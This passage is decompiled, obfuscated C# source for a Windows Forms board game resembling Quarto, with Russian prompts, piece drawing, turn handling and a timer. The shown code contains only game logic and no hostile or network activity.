using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 541765419;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x700174B1u) % 5u)
					{
					case 4u:
						Dark = dark;
						Big = big;
						num = (int)(num2 * 672162247) ^ -1881808417;
						continue;
					case 3u:
						num = (int)(num2 * 1446352652) ^ -1070604306;
						continue;
					case 1u:
						Square = square;
						Point = point;
						num = (int)((num2 * 1359288971) ^ 0x5D2349DB);
						continue;
					default:
						return;
					case 2u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 1573845961;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x7BA5E8CEu) % 7u)
					{
					case 6u:
						num = (int)((num2 * 551058308) ^ 0x265A269A);
						continue;
					case 5u:
						Square = copy.Square;
						num = ((int)num2 * -75742444) ^ 0x7F9D5FC2;
						continue;
					case 3u:
						Big = copy.Big;
						num = ((int)num2 * -1943095966) ^ -901118119;
						continue;
					case 2u:
						Point = copy.Point;
						num = ((int)num2 * -188567649) ^ 0x585ABA1E;
						continue;
					case 0u:
						Dark = copy.Dark;
						num = (int)((num2 * 105811869) ^ 0x43A01F2A);
						continue;
					default:
						return;
					case 4u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = -1514859129;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x812C4C64u) % 3u)
				{
				case 1u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0033:
				num = (int)((num2 * 754644022) ^ 0x3BBCAFF8);
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = -1194112935;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC1F3F32Bu) % 11u)
				{
				case 10u:
					num = (int)(num2 * 186378152) ^ -296192301;
					continue;
				case 9u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 1310702700) ^ -1289931367;
					continue;
				case 8u:
					num = -1823554824;
					continue;
				case 6u:
					num = ((int)num2 * -1620989628) ^ 0x2A33E980;
					continue;
				case 5u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)((num2 * 433390226) ^ 0x1071D610);
					continue;
				}
				case 4u:
					num = (int)(num2 * 578309479) ^ -2102356239;
					continue;
				case 3u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -2094780867;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1898195627;
						num4 = 1898195627;
					}
					else
					{
						num3 = 1081538075;
						num4 = 1081538075;
					}
					num = num3 ^ (int)(num2 * 1291591444);
					continue;
				}
				case 1u:
					num = (int)((num2 * 1661906995) ^ 0x7A723B9C);
					continue;
				default:
					return;
				case 0u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num = -854080676;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBD4B74ABu) % 18u)
				{
				case 17u:
					Paint_Board();
					num = (int)((num2 * 369537476) ^ 0x2C0E0355);
					continue;
				case 16u:
					num4 = 0;
					num = (int)((num2 * 2013574456) ^ 0x131BDF8A);
					continue;
				case 14u:
					flag = num3 < 4;
					num = -256230461;
					continue;
				case 13u:
				{
					int num7;
					if (num4 < 4)
					{
						num = -195411826;
						num7 = -195411826;
					}
					else
					{
						num = -2104284460;
						num7 = -2104284460;
					}
					continue;
				}
				case 12u:
					num = ((int)num2 * -1398744048) ^ 0x34456415;
					continue;
				case 11u:
					num = (int)((num2 * 1523613945) ^ 0x1C72A98);
					continue;
				case 10u:
					num4++;
					num = (int)(num2 * 1949816489) ^ -2116018144;
					continue;
				case 9u:
					num = ((int)num2 * -524031544) ^ -588816550;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -108578130) ^ -497783471;
					continue;
				case 7u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num = ((int)num2 * -1370344762) ^ 0x479EA1F;
					continue;
				case 6u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 976732489;
						num6 = 976732489;
					}
					else
					{
						num5 = 938271093;
						num6 = 938271093;
					}
					num = num5 ^ ((int)num2 * -1586446163);
					continue;
				}
				case 5u:
					num3 = 0;
					num = -24635725;
					continue;
				case 4u:
					Paint_Storage();
					num = (int)(num2 * 170330693) ^ -1192357888;
					continue;
				case 2u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = -2122514608;
					continue;
				case 1u:
					num = ((int)num2 * -2112667332) ^ -1520930132;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 1535242810) ^ -691072955;
					continue;
				case 15u:
					break;
				default:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		bool big = default(bool);
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		float num6 = default(float);
		float num10 = default(float);
		float num7 = default(float);
		float num11 = default(float);
		float num8 = default(float);
		bool square = default(bool);
		bool dark = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		while (true)
		{
			int num = 891905394;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x130B3281u) % 39u)
				{
				case 38u:
				{
					int num16;
					int num17;
					if (big)
					{
						num16 = -253016613;
						num17 = -253016613;
					}
					else
					{
						num16 = -2041647263;
						num17 = -2041647263;
					}
					num = num16 ^ (int)(num2 * 1718444783);
					continue;
				}
				case 37u:
					flag = board[num4, num3] != null;
					num = ((int)num2 * -892910458) ^ -172877135;
					continue;
				case 36u:
					num = 220983258;
					continue;
				case 35u:
					num = 1599182451;
					continue;
				case 33u:
					num = (int)(num2 * 1588489487) ^ -278843647;
					continue;
				case 32u:
					num4++;
					num = (int)((num2 * 1820906268) ^ 0x688707AC);
					continue;
				case 31u:
					num6 = (float)size * (num10 / 2f);
					num7 = num11 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 1203613147) ^ -1492513749;
					continue;
				case 30u:
					num = (int)(num2 * 967061466) ^ -114916232;
					continue;
				case 29u:
					num8 = 0.7f;
					num = 107054103;
					continue;
				case 28u:
				{
					int num12;
					int num13;
					if (!square)
					{
						num12 = 1200903213;
						num13 = 1200903213;
					}
					else
					{
						num12 = 650449545;
						num13 = 650449545;
					}
					num = num12 ^ ((int)num2 * -555953624);
					continue;
				}
				case 27u:
					num10 = 1f - num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num10 / 2f);
					num7 = num11 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 361010900;
					continue;
				case 26u:
				{
					int num20;
					int num21;
					if (!flag)
					{
						num20 = -1736976326;
						num21 = -1736976326;
					}
					else
					{
						num20 = -582573732;
						num21 = -582573732;
					}
					num = num20 ^ ((int)num2 * -1492063080);
					continue;
				}
				case 25u:
				{
					int num18;
					int num19;
					if (!dark)
					{
						num18 = -1285021738;
						num19 = -1285021738;
					}
					else
					{
						num18 = -1097900624;
						num19 = -1097900624;
					}
					num = num18 ^ ((int)num2 * -614399816);
					continue;
				}
				case 24u:
					big = board[num4, num3].Big;
					num = 1963942591;
					continue;
				case 23u:
					num3++;
					num = (int)((num2 * 821571588) ^ 0x3F2F441);
					continue;
				case 22u:
					square = board[num4, num3].Square;
					num = (int)(num2 * 1936763064) ^ -662443784;
					continue;
				case 21u:
					num10 = 1f - num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num11 = (float)size * num8;
					num = 680823050;
					continue;
				case 20u:
				{
					int num14;
					int num15;
					if (board[num4, num3].Point)
					{
						num14 = -1758573653;
						num15 = -1758573653;
					}
					else
					{
						num14 = -641072846;
						num15 = -641072846;
					}
					num = num14 ^ (int)(num2 * 1710705190);
					continue;
				}
				case 19u:
					Form1.smethod_24(graphics_, brush_, num6 + (float)(num3 * size), num6 + (float)(num4 * size), num7, num7);
					num = 754344635;
					continue;
				case 18u:
					brush_ = Form1.smethod_26();
					num = 1240146037;
					continue;
				case 17u:
				{
					int num9;
					if (num3 < 4)
					{
						num = 1881612815;
						num9 = 1881612815;
					}
					else
					{
						num = 1127202825;
						num9 = 1127202825;
					}
					continue;
				}
				case 16u:
					num8 = 1f;
					num = ((int)num2 * -1151055713) ^ 0x4F803069;
					continue;
				case 15u:
					dark = board[num4, num3].Dark;
					num = (int)((num2 * 1750994042) ^ 0x3794E800);
					continue;
				case 14u:
					num = ((int)num2 * -1377358273) ^ -794862210;
					continue;
				case 13u:
					num = (int)((num2 * 159137826) ^ 0x694E1D57);
					continue;
				case 12u:
					Form1.smethod_28(graphics_, brush_, num6 + (float)(num3 * size), num6 + (float)(num4 * size), num7, num7);
					num = ((int)num2 * -1806608138) ^ 0x55134AAC;
					continue;
				case 11u:
					num = (int)(num2 * 1132190319) ^ -1816615563;
					continue;
				case 10u:
					num = 2139149919;
					continue;
				case 9u:
					num = ((int)num2 * -421348053) ^ -2147110948;
					continue;
				case 8u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -472021812) ^ -1354918367;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6 + (float)(num3 * size), num6 + (float)(num4 * size), num7, num7);
					num = (int)((num2 * 1450570894) ^ 0x2DB4B274);
					continue;
				case 6u:
					num = ((int)num2 * -1841783183) ^ -1154828758;
					continue;
				case 5u:
				{
					int num5;
					if (num4 < 4)
					{
						num = 1561585917;
						num5 = 1561585917;
					}
					else
					{
						num = 1831911801;
						num5 = 1831911801;
					}
					continue;
				}
				case 4u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 315204175) ^ 0x5257A36D);
					continue;
				case 3u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num4 = 0;
					num = (int)((num2 * 679720126) ^ 0x3ACDE3AF);
					continue;
				case 1u:
					num = (int)(num2 * 335726751) ^ -1863594490;
					continue;
				case 0u:
					num3 = 0;
					num = 1496647561;
					continue;
				case 2u:
					break;
				default:
					Form1.smethod_30((Control)(object)pictureBox1);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		Brush brush_ = default(Brush);
		bool flag = default(bool);
		Graphics graphics_ = default(Graphics);
		float num12 = default(float);
		float num13 = default(float);
		float num4 = default(float);
		int num9 = default(int);
		bool point = default(bool);
		bool big = default(bool);
		bool flag2 = default(bool);
		float num11 = default(float);
		bool flag3 = default(bool);
		while (true)
		{
			int num2 = -1880638077;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xD393F19Eu) % 33u)
				{
				case 32u:
					num2 = (int)((num3 * 1573039713) ^ 0x32BEA021);
					continue;
				case 31u:
					brush_ = Form1.smethod_26();
					num2 = -350862557;
					continue;
				case 30u:
					num++;
					num2 = (int)(num3 * 851998057) ^ -1117057353;
					continue;
				case 29u:
					num2 = (int)(num3 * 605487883) ^ -584477020;
					continue;
				case 28u:
				{
					int num15;
					int num16;
					if (!flag)
					{
						num15 = 1189896530;
						num16 = 1189896530;
					}
					else
					{
						num15 = 2033748520;
						num16 = 2033748520;
					}
					num2 = num15 ^ (int)(num3 * 1437252716);
					continue;
				}
				case 27u:
					Form1.smethod_24(graphics_, brush_, num12, num12, num13, num13);
					num2 = -777577485;
					continue;
				case 26u:
					num4 = 1f;
					num2 = ((int)num3 * -1600369647) ^ 0x701D2839;
					continue;
				case 25u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num9]));
					int num19;
					int num20;
					if (!storage[num, num9].Dark)
					{
						num19 = 1491167083;
						num20 = 1491167083;
					}
					else
					{
						num19 = 879511086;
						num20 = 879511086;
					}
					num2 = num19 ^ (int)(num3 * 1334827335);
					continue;
				}
				case 24u:
				{
					int num7;
					int num8;
					if (point)
					{
						num7 = -2140944105;
						num8 = -2140944105;
					}
					else
					{
						num7 = -384500894;
						num8 = -384500894;
					}
					num2 = num7 ^ (int)(num3 * 1418771382);
					continue;
				}
				case 23u:
					num2 = (int)(num3 * 1732666748) ^ -1350426516;
					continue;
				case 22u:
					big = storage[num, num9].Big;
					num2 = -396093646;
					continue;
				case 21u:
					flag = storage[num, num9] != null;
					num2 = -442540543;
					continue;
				case 20u:
				{
					int num21;
					int num22;
					if (!flag2)
					{
						num21 = -777813742;
						num22 = -777813742;
					}
					else
					{
						num21 = -286020362;
						num22 = -286020362;
					}
					num2 = num21 ^ ((int)num3 * -519634698);
					continue;
				}
				case 19u:
					num2 = (int)(num3 * 1225224369) ^ -2040051825;
					continue;
				case 18u:
					Form1.smethod_20(pictureBox[num, num9], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num9]), Form1.smethod_16((Control)(object)pictureBox[num, num9])));
					num2 = (int)(num3 * 1888232059) ^ -767074143;
					continue;
				case 17u:
					num2 = ((int)num3 * -640724744) ^ -200335282;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num12, num12, num13, num13);
					num2 = ((int)num3 * -1342226468) ^ 0x45F4D522;
					continue;
				case 15u:
					num2 = (int)(num3 * 1125606486) ^ -946322547;
					continue;
				case 13u:
				{
					float num10 = 1f - num4 * 0.4f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * (num10 / 2f) - 4f;
					num13 = num11 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num, num9].Point;
					num2 = -301908500;
					continue;
				}
				case 12u:
					Form1.smethod_30((Control)(object)pictureBox[num, num9]);
					num2 = -1025882367;
					continue;
				case 11u:
				{
					int num17;
					int num18;
					if (!flag3)
					{
						num17 = 507669311;
						num18 = 507669311;
					}
					else
					{
						num17 = 1493057800;
						num18 = 1493057800;
					}
					num2 = num17 ^ (int)(num3 * 2049251679);
					continue;
				}
				case 10u:
					flag3 = num9 < 4;
					num2 = -1267779042;
					continue;
				case 9u:
					num9++;
					num2 = -2036160939;
					continue;
				case 8u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -1714025998) ^ 0x73DEE3B3;
					continue;
				case 7u:
					Form1.smethod_28(graphics_, brush_, num12, num12, num13, num13);
					num2 = ((int)num3 * -1107184307) ^ -194748479;
					continue;
				case 6u:
					flag2 = num < 4;
					num2 = -696654509;
					continue;
				case 5u:
				{
					float num10 = 1f - num4 * 0.9f / (float)Form1.smethod_27(2.0);
					num11 = (float)size * num4;
					num12 = (float)size * (num10 / 2f) - 4f;
					num13 = num11 * 0.9f / (float)Form1.smethod_27(2.0);
					int num14;
					if (num9 < 2)
					{
						num2 = -442621715;
						num14 = -442621715;
					}
					else
					{
						num2 = -416743313;
						num14 = -416743313;
					}
					continue;
				}
				case 4u:
					num9 = 0;
					num2 = -1345589414;
					continue;
				case 3u:
				{
					int num5;
					int num6;
					if (!big)
					{
						num5 = 1930873863;
						num6 = 1930873863;
					}
					else
					{
						num5 = 1260371927;
						num6 = 1260371927;
					}
					num2 = num5 ^ ((int)num3 * -1961307035);
					continue;
				}
				case 1u:
					num2 = (int)((num3 * 2137083301) ^ 0x71C6398F);
					continue;
				case 0u:
					num4 = 0.7f;
					num2 = -357129870;
					continue;
				default:
					return;
				case 14u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num6 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -946410555;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE2738035u) % 27u)
				{
				case 26u:
				{
					int num11;
					if (num6 >= 4)
					{
						num = -804700106;
						num11 = -804700106;
					}
					else
					{
						num = -550842341;
						num11 = -550842341;
					}
					continue;
				}
				case 25u:
					Form1.smethod_35(timer1, bool_0: true);
					Form1.smethod_36(timer1);
					num = (int)(num2 * 1024492607) ^ -1112611512;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num6], bool_0: true);
					num = -830583080;
					continue;
				case 23u:
					flag2 = num5 < 4;
					num = -644519729;
					continue;
				case 22u:
					num3 = Form1.smethod_33(rnd, 4);
					num4 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1490619703) ^ -1909715927;
					continue;
				case 21u:
					num = (int)((num2 * 2027735082) ^ 0x13EE1B0F);
					continue;
				case 19u:
					num5++;
					num = ((int)num2 * -15901199) ^ 0x4288DF0E;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -79220735) ^ 0x44BF90CD;
					continue;
				case 17u:
					num6++;
					num = ((int)num2 * -493132203) ^ 0x8C9C6BD;
					continue;
				case 16u:
					num = (int)(num2 * 1466904802) ^ -644951110;
					continue;
				case 15u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -333830795;
					continue;
				case 14u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -857768583) ^ 0xB8AB2AB;
					continue;
				case 13u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 945553583) ^ -332698193;
					continue;
				case 12u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 40035924;
						num10 = 40035924;
					}
					else
					{
						num9 = 1108641415;
						num10 = 1108641415;
					}
					num = num9 ^ ((int)num2 * -1479296580);
					continue;
				}
				case 11u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = -725171223;
						num8 = -725171223;
					}
					else
					{
						num7 = -267171129;
						num8 = -267171129;
					}
					num = num7 ^ ((int)num2 * -275673829);
					continue;
				}
				case 10u:
					flag = turn;
					num = (int)(num2 * 393766787) ^ -399140165;
					continue;
				case 9u:
					num6 = 0;
					num = -2025902332;
					continue;
				case 8u:
					num5 = 0;
					num = (int)((num2 * 144454290) ^ 0x17355330);
					continue;
				case 7u:
					num = -1932403898;
					continue;
				case 6u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -435558805) ^ -1492538102;
					continue;
				case 5u:
					num = ((int)num2 * -663041358) ^ 0x6AA69E1E;
					continue;
				case 4u:
					num = (int)(num2 * 902298972) ^ -1582379443;
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Blue);
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1225239589) ^ 0x1C3CD382);
					continue;
				case 2u:
					step = 1;
					num = ((int)num2 * -1076192513) ^ -1787190727;
					continue;
				case 1u:
					step = 0;
					num = (int)((num2 * 511969354) ^ 0x2DF0B34F);
					continue;
				default:
					return;
				case 20u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1713839599;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3A1A2745u) % 5u)
				{
				case 2u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 1234800398) ^ -1945751386;
					continue;
				case 1u:
					time = time.AddSeconds(1.0);
					num = ((int)num2 * -368094031) ^ -1981357068;
					continue;
				case 0u:
					num = ((int)num2 * -1364369077) ^ -1542442641;
					continue;
				default:
					return;
				case 3u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0214: Expected O, but got Unknown
		int num4 = default(int);
		Point point = default(Point);
		int num3 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1564318561;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0xBC454433u) % 25u)
				{
				case 24u:
					num4 = 0;
					num = ((int)num2 * -325168915) ^ -979226483;
					continue;
				case 22u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num3 = point.X / size;
					num = (int)(num2 * 1860994573) ^ -213545869;
					continue;
				case 21u:
				{
					int num14;
					if (num7 < 4)
					{
						num = -1676856307;
						num14 = -1676856307;
					}
					else
					{
						num = -553818183;
						num14 = -553818183;
					}
					continue;
				}
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -1893068182) ^ -1841263392;
					continue;
				case 19u:
					num7 = 0;
					num = -24698163;
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num8, num3], Color.Red);
					num = (int)((num2 * 1055587685) ^ 0x7A1B8783);
					continue;
				case 17u:
					flag3 = num3 > 1;
					num = ((int)num2 * -647063855) ^ 0x64DA78D3;
					continue;
				case 16u:
					num8 = point.Y / size;
					num = ((int)num2 * -853544667) ^ -432593238;
					continue;
				case 15u:
					num4++;
					num = ((int)num2 * -1245053009) ^ -645056308;
					continue;
				case 14u:
					num = (int)((num2 * 1487133702) ^ 0x25F2CBC8);
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num4, num7], Color.White);
					num = -137643572;
					continue;
				case 12u:
					num = ((int)num2 * -1838541898) ^ -548494982;
					continue;
				case 11u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = 1504067119;
						num13 = 1504067119;
					}
					else
					{
						num12 = 42395092;
						num13 = 42395092;
					}
					num = num12 ^ (int)(num2 * 1074805800);
					continue;
				}
				case 10u:
					num7++;
					num = (int)(num2 * 983193463) ^ -686682191;
					continue;
				case 9u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = -1045416865;
						num11 = -1045416865;
					}
					else
					{
						num10 = -1766859630;
						num11 = -1766859630;
					}
					num = num10 ^ ((int)num2 * -1245714350);
					continue;
				}
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1422461358) ^ 0x549CE224);
					continue;
				case 7u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num8, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0222;
				case 6u:
					num = ((int)num2 * -975257485) ^ 0xEEB7122;
					continue;
				case 5u:
					if (storage[num8, num3] != null)
					{
						num = -1249650190;
						continue;
					}
					num9 = 0;
					goto IL_0222;
				case 4u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -633261400) ^ -180674024;
					continue;
				case 3u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = -795436793;
						num6 = -795436793;
					}
					else
					{
						num5 = -1015160629;
						num6 = -1015160629;
					}
					num = num5 ^ ((int)num2 * -1714406445);
					continue;
				}
				case 2u:
					flag = num4 < 4;
					num = -785430977;
					continue;
				case 1u:
					num3 -= 4;
					num = ((int)num2 * -34255944) ^ -2016753148;
					continue;
				default:
					return;
				case 0u:
					break;
				case 23u:
					return;
					IL_0222:
					flag2 = (byte)num9 != 0;
					num = -1876460690;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num2 = Form1.smethod_39(e) / size;
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num6 = default(int);
		while (true)
		{
			int num3 = 262831134;
			while (true)
			{
				uint num4;
				int num8;
				switch ((num4 = (uint)num3 ^ 0x2453A73u) % 23u)
				{
				case 22u:
					num3 = (int)(num4 * 332656406) ^ -168640761;
					continue;
				case 21u:
					num5++;
					num3 = (int)((num4 * 1965416386) ^ 0x100F60EF);
					continue;
				case 20u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num2 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num3 = ((int)num4 * -1652236342) ^ 0x31CA3288;
					continue;
				case 19u:
					flag = num5 < 4;
					num3 = 49160314;
					continue;
				case 18u:
					num8 = ((board[num2, num] == null) ? 1 : 0);
					goto IL_00e0;
				case 17u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -795247312;
						num11 = -795247312;
					}
					else
					{
						num10 = -561108115;
						num11 = -561108115;
					}
					num3 = num10 ^ ((int)num4 * -924715474);
					continue;
				}
				case 16u:
				{
					int num12;
					int num13;
					if (!flag)
					{
						num12 = 315396789;
						num13 = 315396789;
					}
					else
					{
						num12 = 1548230205;
						num13 = 1548230205;
					}
					num3 = num12 ^ ((int)num4 * -178288584);
					continue;
				}
				case 15u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num3 = ((int)num4 * -1247451979) ^ -1581231474;
						continue;
					}
					num8 = 0;
					goto IL_00e0;
				case 14u:
					num6++;
					num3 = 1289230296;
					continue;
				case 13u:
					num6 = 0;
					num3 = 1289230296;
					continue;
				case 11u:
				{
					int num9;
					if (Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue)
					{
						num3 = 682791017;
						num9 = 682791017;
					}
					else
					{
						num3 = 587020907;
						num9 = 587020907;
					}
					continue;
				}
				case 10u:
					Form1.smethod_45(graphics_);
					num3 = (int)((num4 * 1308345664) ^ 0x1C592F40);
					continue;
				case 9u:
					num5 = 0;
					num3 = (int)((num4 * 1068669612) ^ 0x6391A883);
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num3 = (int)((num4 * 1641725215) ^ 0x6A258199);
					continue;
				case 7u:
				{
					int num7;
					if (num6 < 4)
					{
						num3 = 110750436;
						num7 = 110750436;
					}
					else
					{
